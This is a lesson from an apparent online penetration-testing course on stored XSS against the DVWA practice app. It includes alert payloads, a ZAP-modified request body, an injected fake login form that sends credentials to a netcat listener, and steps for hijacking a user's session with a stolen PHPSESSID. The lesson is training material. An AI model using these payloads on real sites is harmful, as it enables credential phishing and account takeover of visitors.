In this lesson, let’s take a look at manual stored attacks, by going to the XSS (Stored) tab in the DVWA.

We can see a guestbook where we can leave comments, similar to a product review page, news feed, discussion forums, or something to that effect, where you can expect different users to visit this page. So the goal would be to leave a stored XSS payload so that every time the page loads, the user’s information is sent to our servers, for example.

# Testing the form
Let’s start out with a simple test to see how the form works.:
> Test

> Hello, this is a test comment from Christophe to see…

There’s a character limit preventing me from writing more. That could definitely be a challenge for our XSS payloads since it limits how many characters we can enter. 

With that said, and you’ll already know this if you’ve taken courses from me before, but just because there is a character limit imposed by the front-end does not mean there’s a character limit imposed by the back-end.

What I mean is that the character limit could just be some front-end JavaScript or HTML code checking how many characters have been entered. But if we bypass this front-end and send a request directly to the back-end server, we could potentially bypass this limitation.

An alternative to this would be to try and use tiny XSS payloads. Here’s handy cheat sheet: [https://github.com/terjanq/Tiny-XSS-Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)

Before we test that out, let’s do a quick check on the basics to verify vulnerability. We’re on the security level of low right now, so the script tags probably won’t work. Let’s use an SVG tag instead:

`<svg onload=alert(1)>`

Awesome, that worked. Now if we navigate away from this page and come back, unlike with the reflective XSS, the persistent XSS makes it so that it’s now permanently stored on the server and displayed on this page until someone cleans it up!

But again, this payload is next to useless outside of finding a vulnerability. Let’s see if we can’t do something more interesting.

# Using OWASP ZAP
OK, let’s clear the guestbook so that we don’t get the annoying pop-up every time, and let’s pull up OWASP ZAP. OWASP ZAP, if you’re not familiar, is a free and open-source penetration testing tool being maintained under the umbrella of OWASP.

We’re going to use it in this lesson as a proxy which stands between our browser and the web application, so that we can intercept and inspect messages sent between the browser and that web application. That allows us to modify requests going back and forth, which will be perfect for this scenario since it will allow us to bypass front-end security controls and communicate directly with the back-end.

1. Open ZAP
2. Don’t persist session (unless you want to)
3. Open FireFox browser (if you can’t get the browser to open, [try this fix](https://cybr.com/forums/discussion/browser-does-not-popping-out/))
4. Login to DVWA (127.0.0.1) and navigate to the XSS (Stored) page
5. Set a breakpoint
6. Submit a test comment
7. Open/Resend with Request Editor
8. Change the `mtxMessage=` to your payload of choice, like:

`<IMG SRC=# onmouseover="alert('xxs')">`

So it will look like:
`txtName=fkgfjdg&mtxMessage=<IMG SRC=# onmouseover="alert('xxs')">&btnSign=Sign+Guestbook`

Great, that worked! Now, let’s do something we haven’t done yet.

# Creating a fake login form
Instead of trying to send cookie information to our remote server, let’s try to get the actual username and password from the user. One way to do that is by tricking the user with a fake login form. Since we know this form is vulnerable, we can try to inject all kinds of tags. Up until this point, we’ve used script tags, image tags, and svg tags. Now, let’s create a fake form.

For the form action, we’ll point to our remote server, so that the username and password are sent in plain text to our netcat listener.

```<h3>Please login to see</h3> <form action=http://127.0.0.1:4444>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>```

Start your netcat listener:

`nc -lvp 4444`

Submit the request through ZAP.

When the visitor comes to the page, they see a login form that tells them they need to log in if they want to see the comments. They submit their information, and that form opens a connection to our URL, and if we look at our netcat listener, we’ll see the username and password in plain text, and we get their cookie information!

Again, unlike with the reflected attack, now any time a user visits this page, they’ll see the login form, even without having to click on a crafted URL. Unsuspecting visitors will just assume they have to login again in order to see the comments, product details, or whatever it is that’s supposed to be on this page.

That’s what makes stored/persistent XSS attacks so scary. Yes, they’re usually harder to find and pull off, but when they are successfully exploited, they can do far more damage to a greater number of people.

# Bonus: Steal session information to login
Let’s do one more thing before we move on to the next lesson. Let’s use this PHPSESSID information to login as this user. Of course, technically, since we have their username and password, we should be able to login as them and therefore we don’t have to steal their session, but let’s pretend like we don’t have that.

Open up a different browser window. Navigate to the DVWA. It should ask you to login, since you haven’t established a session in that browser.

Open your DevTools with F12. Go to the Storage tab. Edit the PHPSESSID to be what we just copied.

Now navigate to [http://localhost](http://localhost) or another page that’s supposed to be private, and you won’t be asked to login. That’s because, as far as the application knows, we are now logged in as the other user without even needing to enter a username or password.

Feel free to play around with more persisted attacks to see what all you can do! Then, mark this lesson as complete and move on to the next.
